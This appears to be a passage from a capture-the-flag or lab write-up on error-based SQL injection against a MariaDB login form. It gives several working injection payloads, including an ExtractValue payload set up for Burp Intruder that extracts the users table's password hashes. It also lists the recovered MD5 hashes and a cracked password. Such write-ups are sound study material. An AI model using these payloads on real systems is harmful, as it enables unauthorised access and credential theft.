With very little trial and error we get the following to **not** trigger an error, so we can guess that we want to target the *users* table.

```http
username=admin%27+OR+1=(SELECT+1+FROM+users+LIMIT+1)+;--+-
```

Other things that do not trigger errors are the following

```http
username=admin%27+OR+1=(SELECT+username+FROM+users+LIMIT+1)+;--+-
```

```http
username=admin%27+OR+1=(SELECT+password+FROM+users+LIMIT+1)+;--+-
```

In this case i simply looked for examples of error based SQL injection for MariaDB (from the error messages this is the one being used). I got the following payload which works pretty nicely for this website:

```http
username=admin%27+OR+ExtractValue('',Concat('=',SUBSTRING((SELECT+GROUP_CONCAT(password+SEPARATOR+0x2c)+FROM+users),§1§,10)))+;--+-
```

(part of the query is input for Burp Suite, as the error is shortened after some characters, so i had intruder change positions to extract all the hashes)

| username  | hash                             |
| --------- | -------------------------------- |
| admin     | 31a181c8372e3afc59dab863430610e8 |
| dthompson | c585d01f2eb3e6e1073e92023088a3dd |
| janderson | 1e68b6eb86b45f6d92f8f292428f77ac |
| mwatson   | 633b683cc128fe244b00f176c8a950f5 |

Turns out the password is an easy one in md5, **greencacti2001**. (used crackstation for this)

Now we can [[login]].